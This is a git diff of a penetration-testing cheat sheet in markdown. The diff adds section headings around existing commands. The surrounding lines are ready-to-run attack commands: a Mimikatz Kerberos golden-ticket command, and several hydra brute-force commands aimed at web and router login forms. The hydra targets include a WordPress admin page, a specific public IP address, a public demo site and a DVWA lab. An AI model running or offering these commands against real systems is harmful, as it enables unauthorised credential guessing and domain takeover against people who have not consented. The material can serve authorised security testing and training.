@@ -193,6 +193,8 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:ninja.co
 | For example  |
 | ------------- |
 |hydra -l admin -P /usr/share/wordlists/rockyou.txt  -f -V -s 80 192.168.1.2 http-get /wp-admin/|
+
+**HTTP POST Base**
 ```
 hydra -l root -P /usr/share/wordlists/rockyou.txt  -f -V -s 7001 178.72.90.181 http-post-form "/cgi-bin/luci:username=^USER^&password=^PASS^:Invalid username"
 ```
@@ -200,6 +202,7 @@ hydra -l root -P /usr/share/wordlists/rockyou.txt  -f -V -s 7001 178.72.90.181 h
 hydra -l IRISnoir -P /usr/share/wordlists/rockyou.txt -e nsr -v -V http-post-form://testasp.vulnweb.com/"Login.asp?RetURL=%2FDefault%2Easp%3F:tfUName=^USER^&tfUPass=^PASS^:S=logout"
 ```
 
+**HTTP GET Base**
 ```
 hydra 192.168.100.155 -V -l admin -P passwordlist http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: PHPSESSID=rjevaetqb3dqbj1ph3nmjchel2; security=low"
 ```
